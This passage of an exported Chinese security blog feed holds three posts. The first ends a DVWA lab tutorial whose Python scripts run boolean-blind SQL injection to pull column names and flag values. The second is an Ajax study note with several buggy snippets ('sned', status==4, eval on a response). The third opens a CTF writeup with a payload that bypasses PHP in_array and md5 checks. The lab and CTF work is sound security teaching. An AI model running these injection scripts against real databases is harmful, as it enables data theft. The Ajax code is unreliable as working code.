class="number">1</span>,columnLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads: <span class="comment"># i在上个循环用过了</span></span><br><span class="line">                    column_payload = <span class="string">'?id=1\' and substr((select column_name from information_schema.columns where table_name=\'flagishere\' limit '</span>+str(j)+<span class="string">',1),'</span>+str(m)+<span class="string">',1)=\''</span>+str(n)+<span class="string">'\' %23&amp;Submit=Submit#'</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+column_payload, headers=headers).text:</span><br><span class="line">                        column_name += n</span><br><span class="line">            print(<span class="string">'column'</span>+str(j+<span class="number">1</span>)+<span class="string">'_name: '</span>+column_name)</span><br></pre></td></tr></table></figure></p>
<p><strong>脚本二运行结果如下：</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302171725965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="script2"></p>
<p><strong>（3）脚本三：爆字段内容</strong><br>由脚本二的结果得知，真正的flag应该在’flagishere’表中的’flag’列下，所有脚本三就跑出该列下每条记录的值，也就是最终的flag(这里为了展示脚本可以爆多条记录的功能，所以自己设置了两个flag)<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据上个脚本得到的结果，此脚本用来跑出'flagishere'表中的字段名为'flag'</span></span><br><span class="line"><span class="comment"># 所以此脚本用来爆破flag字段中的内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()  <span class="comment"># 保持回话</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost:8081/dvwa/vulnerabilities/sqli_blind/'</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="string">'abcdefghijklmnopqrstuvwxyz1234567890\&#123;\&#125;'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'security=low; PHPSESSID=cv0csro3c3kk4o03dia88nopc0'</span>&#125;</span><br><span class="line"><span class="comment"># 因为dvwa需要登陆，所以要在头部里加入cookie</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断flag字段中记录(行)数量</span></span><br><span class="line">rowNum = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    rowNum_payload = <span class="string">'?id=1\' and (select count(*) from flagishere)='</span>+str(j)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+rowNum_payload, headers=headers).text:</span><br><span class="line">        rowNum = j</span><br><span class="line">print(<span class="string">"row_number: "</span>+str(rowNum))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先爆每个字段值长度，以便控制循环，提高效率，也可省略此步骤，但要保证循环大于字段长度</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,rowNum+<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">    rowContent = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">       <span class="comment">#rowLen_payload = '?id=1\' and length(substr(select flag from flagishere limit '+str(j)+',1),1)='+str(i)+' %23&amp;Submit=Submit#'</span></span><br><span class="line">        rowLen_payload = <span class="string">'?id=1\' and length(substr((select flag from flagishere limit '</span>+str(j)+<span class="string">',1),1))='</span>+str(i)+<span class="string">' %23&amp;Submit=Submit#'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+rowLen_payload, headers=headers).text:    </span><br><span class="line">            rowLen = i</span><br><span class="line">            print(<span class="string">'row'</span>+str(j+<span class="number">1</span>)+<span class="string">'_length: '</span>+str(rowLen))</span><br><span class="line">            <span class="comment">#爆出个字段内容</span></span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>,rowLen+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> payloads:</span><br><span class="line">                    rowContent_payload = <span class="string">'?id=1\' and substr((select flag from flagishere limit '</span>+str(j)+<span class="string">',1),'</span>+str(m)+<span class="string">',1)=\''</span>+str(n)+<span class="string">'\' %23&amp;Submit=Submit#'</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> s.get(url+rowContent_payload, headers=headers).text:</span><br><span class="line">                        rowContent += n  </span><br><span class="line">            print(<span class="string">'row'</span>+str(j+<span class="number">1</span>)+<span class="string">'_content: '</span>+rowContent)</span><br></pre></td></tr></table></figure></p>
<p><strong>脚本三运行结果如下:</strong><br><img src="/2019/03/02/以dvwa为例学习简单sql布尔盲注的详细脚本/20190302172239513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="script3"></p>
<p><br></p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>由于是刚入门的小白，各方面都在起步之中，还有许多需要继续努学习的，尤其要提高自己的代码编写能力，关于sql注入的学习也还会继续。</p>
]]></content>
      <categories>
        <category>System Security</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>学一下Ajax</title>
    <url>/2019/09/19/%E5%AD%A6%E4%B8%80%E4%B8%8BAjax/</url>
    <content><![CDATA[<h2 id="0x01-Axaj简介"><a href="#0x01-Axaj简介" class="headerlink" title="0x01 Axaj简介"></a>0x01 Axaj简介</h2><h6 id="（1）概述"><a href="#（1）概述" class="headerlink" title="（1）概述"></a>（1）概述</h6><p>AJAX = 异步 JavaScript 和 XML。</p>
<p>AJAX 是一种用于创建快速动态网页的技术。</p>
<p>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
<h6 id="（2）Ajax的执行过程"><a href="#（2）Ajax的执行过程" class="headerlink" title="（2）Ajax的执行过程"></a>（2）Ajax的执行过程</h6><p>使用Ajax技术通常包括以下几个步骤：</p>
<ul>
<li>创建一个Ajax对象。</li>
<li>在此对象的基础上根据HTTP协议的规范向服务器发送HTTP请求。</li>
<li>服务器接收到Ajax请求后会响应此请求，并根据事先约定的格式返回相应的数据集。</li>
<li>浏览器接收到服务器的响应，获取返回数据集，更新部分网页内容。</li>
</ul>
<p>用一句话概括，即Ajax通过XMLHttpRequest对象向服务器发出HTTP请求，当获取到服务器返回的数据后进行相应的页面数据的渲染处理。</p>
<p><br></p>
<h2 id="0x02-XHR对象创建"><a href="#0x02-XHR对象创建" class="headerlink" title="0x02 XHR对象创建"></a>0x02 XHR对象创建</h2><p>Ajax的核心是XMLHttpRequest对象（简称为XHR对象）的使用，XMLHttpRequest对象作为浏览器请求服务器的一个接口，可以使用异步的方式通过浏览器向服务器发送请求并解析服务器的响应。</p>
<p>使用Ajax服务器发送HTTP请求的首要任务是创建一个XMLHttpRequest对象，也称实例化XHR对象，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	<span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="0x03-Ajax发送请求"><a href="#0x03-Ajax发送请求" class="headerlink" title="0x03 Ajax发送请求"></a>0x03 Ajax发送请求</h2><h6 id="（1）open-方法"><a href="#（1）open-方法" class="headerlink" title="（1）open() 方法"></a>（1）open() 方法</h6><p>用法：<br><figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">open(<span class="function"><span class="keyword">method</span>,<span class="title">url</span>,<span class="title">async</span>)</span></span><br></pre></td></tr></table></figure></p>
<p>规定请求的类型、URL 以及是否异步处理请求。</p>
<ul>
<li>method：请求的类型；GET 或 POST</li>
<li>url：文件在服务器上的位置</li>
<li>async：true（异步）或 false（同步）</li>
</ul>
<p>demo:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	<span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">	xhr.open(<span class="string">"get"</span>, <span class="string">"./Ajax/demo_get.php"</span>, <span class="literal">true</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<h6 id="（2）send-方法"><a href="#（2）send-方法" class="headerlink" title="（2）send() 方法"></a>（2）send() 方法</h6><p>用法：<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">send</span><span class="params">(string)</span></span></span><br></pre></td></tr></table></figure></p>
<p>open()方法执行完毕后，调用send()方法通过HTTP协议将请求发送到服务器。</p>
<p>如果为GET请求，send()方法无参数，默认为<code>null</code>；如果为POST请求，则send()方法的参数为要发送的数据。</p>
<p>demo:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	<span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">	xhr.open(<span class="string">"get"</span>, <span class="string">"./Ajax/demo_get.php"</span>, <span class="literal">true</span>);</span><br><span class="line">	xhr.sned(<span class="literal">null</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="0x04-Ajax接收响应"><a href="#0x04-Ajax接收响应" class="headerlink" title="0x04 Ajax接收响应"></a>0x04 Ajax接收响应</h2><p>浏览器接收到服务器的响应后，信息可以通过XMLHttpRequest对象的属性和方法使用。在使用XHR对象接收响应的过程中有四个常用的属性，分别为：</p>
<ul>
<li><code>status</code>：以数字形式返回HTTP响应的状态码。</li>
<li><code>responseText</code>：以文本形式作为响应主体被返回。</li>
<li><code>responseXML</code>：如果响应的内容类型。是”text/xml”或”application/xml”，那么此属性将以document形式返回保存响应数据的XML DOM文档。</li>
<li><code>statusText</code>：以文本形式返回HTTP的状态说明。</li>
</ul>
<p>demo:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">	<span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">	xhr.open(<span class="string">"get"</span>, <span class="string">"./Ajax/demo_get.php"</span>, <span class="literal">false</span>);	<span class="comment">//同步请求</span></span><br><span class="line">	xhr.send(<span class="literal">null</span>);</span><br><span class="line">	<span class="comment">//判断请求是否成功</span></span><br><span class="line">	<span class="keyword">if</span>(xhr.status == <span class="number">200</span> || xhr.status == <span class="number">304</span>)&#123;</span><br><span class="line">		alert(xhr.responseText);	<span class="comment">//打印响应数据</span></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		alert(<span class="string">"请求失败，状态码为："</span> + xhr.status);</span><br><span class="line">	&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="0x05-异步Ajax"><a href="#0x05-异步Ajax" class="headerlink" title="0x05 异步Ajax"></a>0x05 异步Ajax</h2><p>如果设置open()方法的第三个参数值为true，则表示Ajax需要异步处理请求。此时，需要判断服务器响应的数据是否传送完成，检测XHR对象中的readState属性的状态码是否为4.</p>
<p>readySate属性表示请求/响应过程当前的状态，如下表：</p>
<table>
<thead>
<tr>
<th>状态码</th>
<th>状态</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>未初始化</td>
<td>尚未调用open方法</td>
</tr>
<tr>
<td>1</td>
<td>启动</td>
<td>已经调用open()，尚未调用send()</td>
</tr>
<tr>
<td>2</td>
<td>发送</td>
<td>已经调用send()，但尚未收到头信息</td>
</tr>
<tr>
<td>3</td>
<td>接收</td>
<td>已经接收到部分相应的主题信息</td>
</tr>
<tr>
<td>4</td>
<td>完成</td>
<td>已经接收到全部响应数据，且可以在客户端使用</td>
</tr>
</tbody>
</table>
<p>理论上，Ajax发送请求处理响应的过程中只要<code>readState</code>的状态码改变一次，就会触发<code>readystatechange</code>事件，因此可以利用这个事件来检测每次状态变化后readySate的值，来判断当前Ajax接收数据的状态。</p>
<p>demo:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadXMLDoc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> xmlhttp;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest)</span><br><span class="line">  &#123;<span class="comment">// code for IE7+, Firefox, Chrome, Opera, Safari</span></span><br><span class="line">  xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;<span class="comment">// code for IE6, IE5</span></span><br><span class="line">  xmlhttp=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建onreadystatechange事件监测Ajax状态变化</span></span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"myDiv"</span>).innerHTML=xmlhttp.responseText;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"/ajax/test1.txt"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">"myDiv"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Let AJAX change this text<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&lt;button type=<span class="string">"button"</span> onclick=<span class="string">"loadXMLDoc()"</span>&gt;通过 AJAX 改变内容&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h2 id="0x06-JSON数据传递"><a href="#0x06-JSON数据传递" class="headerlink" title="0x06 JSON数据传递"></a>0x06 JSON数据传递</h2><p>目前Ajax技术进行数据传递时，采用JSON格式的数据进行传递已经成为事实上的标准。相较与XML而言，使用JSON格式的数据传递实现简单且方便。采用JSON格式的数据进行传递时，往往应用于数据量比较多，且需要清晰传递的情况。但是此种方式传递需要将服务器返回的JSON格式字符串先转化为Javascript对象。</p>
<p>demo：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;input type=<span class="string">"button"</span> onclick=<span class="string">"info();"</span> value=<span class="string">"info"</span>&gt;</span><br><span class="line">        &lt;p id=<span class="string">"name"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">        &lt;p id=<span class="string">"age"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">        &lt;p id=<span class="string">"school"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">        function info()&#123;</span></span><br><span class="line"><span class="regexp">            var xhr = new XMLHttpRequest();</span></span><br><span class="line"><span class="regexp">            xhr.onreadystatechange = function()&#123;</span></span><br><span class="line"><span class="regexp">                if(this.readyState == 4)&#123;</span></span><br><span class="line"><span class="regexp">                    var person = eval('(' + this.responseText + ')');</span></span><br><span class="line"><span class="regexp">                    console.log(person);</span></span><br><span class="line"><span class="regexp">                    document.getElementById('name').innerHTML = "name:" + person.name;</span></span><br><span class="line"><span class="regexp">                    document.getElementById('age').innerHTML = "age:" + person.age;</span></span><br><span class="line"><span class="regexp">                    document.getElementById('school').innerHTML = "school:" + person.school;</span></span><br><span class="line"><span class="regexp">                &#125;</span></span><br><span class="line"><span class="regexp">            &#125;</span></span><br><span class="line"><span class="regexp">            xhr.open('get', 'ajax_json.php', true);</span></span><br><span class="line"><span class="regexp">            xhr.send();</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>
<p>说明：<code>eval()</code>方法可以将JSON字符串转换为JSON对象。</p>
<p>服务端的返回的JSON格式的数据，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $person = [];</span><br><span class="line">    $person[] = <span class="keyword">array</span>(<span class="string">'name'</span> =&gt; <span class="string">'Lethe'</span>,</span><br><span class="line">                      <span class="string">'age'</span> =&gt; <span class="string">'19'</span>,</span><br><span class="line">                      <span class="string">'school'</span> =&gt; <span class="string">'CUMT'</span>);</span><br><span class="line">    $person[] = <span class="keyword">array</span>(<span class="string">'name'</span> =&gt; <span class="string">'Jack'</span>,</span><br><span class="line">                      <span class="string">'age'</span> =&gt; <span class="string">'20'</span>,</span><br><span class="line">                      <span class="string">'school'</span> =&gt; <span class="string">'B'</span>);</span><br><span class="line">    $person[] = <span class="keyword">array</span>(<span class="string">'name'</span> =&gt; <span class="string">'Ben'</span>,</span><br><span class="line">                      <span class="string">'age'</span> =&gt; <span class="string">'20'</span>,</span><br><span class="line">                      <span class="string">'school'</span> =&gt; <span class="string">'C'</span>);</span><br><span class="line">    $n = mt_rand(<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($person[$n]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/09/19/学一下Ajax/20190920010126777.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h2 id="0x06-查询缓存"><a href="#0x06-查询缓存" class="headerlink" title="0x06 查询缓存"></a>0x06 查询缓存</h2><p>为了避免缓存带来的影响，可以向URL中添加一个随机数或者时间戳作为请求数据的一部分，发送给服务器，以保证当前的请求始终为首次发送。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;script type="text/</span>javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    var username = document.getElementsByName("</span>username<span class="string">")[0];</span></span><br><span class="line"><span class="string">    username.onblur = function()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        var xhr = new XMLHttpRequest();</span></span><br><span class="line"><span class="string">        var url = "</span>./Ajax/demo_get.php?username=<span class="string">" + encodeURIComponent(this.value);</span></span><br><span class="line"><span class="string">        xhr.onreadystatechange = function()&#123;</span></span><br><span class="line"><span class="string">            if(xhr.status == 4)&#123;</span></span><br><span class="line"><span class="string">                alert(this.responseText);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string">        xhr.open('GET',url+'&amp;num'+Math.random(), true);</span></span><br><span class="line"><span class="string">        xhr.sned(null);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h2 id="0x07-Ajax函数封装"><a href="#0x07-Ajax函数封装" class="headerlink" title="0x07 Ajax函数封装"></a>0x07 Ajax函数封装</h2><p>使用Ajax发送HTTP请求通常有如下几个步骤：</p>
<ul>
<li><p>实例化XMLHttpRequest对象</p>
</li>
<li><p>通过open()方法规定Ajax发送的请求类型、服务器URL地址，以及是否为异步处理请求。</p>
</li>
<li><p>通过send()方法发送使用open()方法定义好的Ajax请求，并根据XMLHttpRequest对象中规定的具体参数判断Ajax请求响应的状态，根据不同的状态进行不同的操作。</p>
</li>
</ul>
<p>使用Ajax的步骤基本固定，因此可以把上述步骤抽象出来封装成一个Ajax方法，当需要调用Ajax时，直接调用此方法即可，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 创建XHR对象，并设置Ajax默认为GET请求方式，设置回调函数异步处理请求，返回响应</span></span><br><span class="line">    obj.method = obj.method || <span class="string">'get'</span>;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;    <span class="comment">//异步处理请求，接收响应</span></span><br><span class="line">        <span class="keyword">if</span>((xhr.status == <span class="number">4</span>)&amp;&amp;(xhr.status == <span class="number">200</span>))&#123;</span><br><span class="line">            <span class="comment">//callback()为回调函数，若不设置则无回调</span></span><br><span class="line">            obj.callback &amp;&amp; obj.callback(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//分别用GET和POST两种方式创建查询字符串，用来保护用户提交的数据信息，并分别发送Ajax异步请求</span></span><br><span class="line">    <span class="keyword">var</span> strData = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span>(obj.method == <span class="string">'post'</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> obj.data)&#123;</span><br><span class="line">            strData += <span class="string">'&amp;'</span> + key + <span class="string">'='</span> + obj.data[key];</span><br><span class="line">        &#125;</span><br><span class="line">        strData = strData.substring(<span class="number">1</span>); <span class="comment">//去掉开头多余的&amp;</span></span><br><span class="line">        xhr.open(<span class="string">'post'</span>, obj.url, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置请求头</span></span><br><span class="line">        xhr.setRequestHeader(<span class="string">"content-type"</span>, <span class="string">"application/x-www-form-urlencode"</span>);</span><br><span class="line">        xhr.send(strData);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//如果是GET方式，则需要对数据进行编码</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> obj.data)&#123;</span><br><span class="line">            strData += <span class="string">'&amp;'</span> + <span class="built_in">encodeURIComponent</span>(key) + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(obj.data[key]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//去掉多余的&amp;,并增加时间戳，防止缓存</span></span><br><span class="line">        strData = strData.substring(<span class="number">1</span>) + <span class="string">'&amp;'</span> + <span class="built_in">Number</span>(<span class="keyword">new</span> Data());</span><br><span class="line">        xhr.open(<span class="string">'get'</span>, obj.url + <span class="string">'?'</span> + strData, <span class="literal">true</span>);</span><br><span class="line">        xhr.send(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>调用事例如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">html code...</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">&#123;</span></span></span><br><span class="line"><span class="function"><span class="params">    ajax(&#123;</span></span></span><br><span class="line"><span class="function"><span class="params">        url: <span class="string">'/ajax/demo.php'</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        method: <span class="string">'GET'</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        data: &#123;year:year.value, month:month.value, day:dat.value&#125;,</span></span></span><br><span class="line"><span class="function"><span class="params">        callback: function(data</span>)</span>&#123;</span><br><span class="line">            result.innerHTML = data;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Study Notes</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>CumtCTF2019Ⅱ——Writeup（Web详解）</title>
    <url>/2019/03/03/CumtCTF2019%E2%85%A1%E2%80%94%E2%80%94Writeup%EF%BC%88Web%E8%AF%A6%E8%A7%A3%EF%BC%89/</url>
    <content><![CDATA[<h4 id="Web1：签到题"><a href="#Web1：签到题" class="headerlink" title="Web1：签到题"></a>Web1：签到题</h4><p>1、打开题目，源码直接显示在网页上。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302192458801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="web1"></p>
<p>2、发现构造0ver、0ver1、0ver2即可，下面就进行代码审计：</p>
<p>（1）首先构造 0ver，有以下三个条件：<br>① <code>ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)</code>，即要进行一次或多次 0-9 数字正则表达式匹配<br>② <code>in_array($a,$white_list)</code>，即0ver 中要有 range（0，9）<br>③ <code>strlen($a)&gt;1</code>，即0ver 的长度要大于 1</p>
<p>一开始以为要考ereg()截断漏洞，其实是in_array()松散比较，即<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(in_array(<span class="string">'b'</span>, <span class="keyword">array</span>(<span class="string">'a'</span>=&gt;<span class="keyword">true</span>))); </span><br><span class="line">返回值:<span class="keyword">true</span></span><br><span class="line"> </span><br><span class="line">var_dump(in_array(<span class="string">'01'</span>,<span class="keyword">array</span>(<span class="string">'1'</span>)));</span><br><span class="line">返回值也是:<span class="keyword">true</span></span><br></pre></td></tr></table></figure></p>
<p>为什么是这样呢？</p>
<ul>
<li><code>in_array(&#39;b&#39;, array(&#39;a&#39;=&gt;true))</code>  实质上是<code>&#39;b&#39;==true</code> 这样的类型比较，b 是变量或者一个字符串string，和bool 类型比较，结果是true。<br>但是如果 <code>&#39;b&#39;===true</code> 结果可能就不一样了，返回值:false，就是类型比较的问题。</li>
<li>第二个例子，也就是本题的考点之一。<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">var_dump</span>(<span class="string">'01'</span>==<span class="number">1</span>);  返回值<span class="selector-pseudo">:true</span></span><br><span class="line">   <span class="selector-tag">var_dump</span>(<span class="string">'01'</span>===<span class="number">1</span>); 返回值<span class="selector-pseudo">:false</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>因此构造： 0ver=01</strong> </p>
<p>（2）构造 0ver1 和 0ver2，有以下条件：</p>
<pre><code>md5($c) === md5($b) &amp;&amp; ($b !== $c)
</code></pre><p>所以要构造 md5 相同，真值不同的两个参数，但注意这里 md5 用===判断，所以不能利用md5 开头是 0e 的字符串来绕过，但可以利用数组绕过。<br><strong>因此构造：0ver1[]=1&amp;0ver2[]=2</strong></p>
<p>3、最终构造的payload为：<code>?0ver=01&amp;0ver1[]=1&amp;0ver2[]=2</code>，得到 flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303100623661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
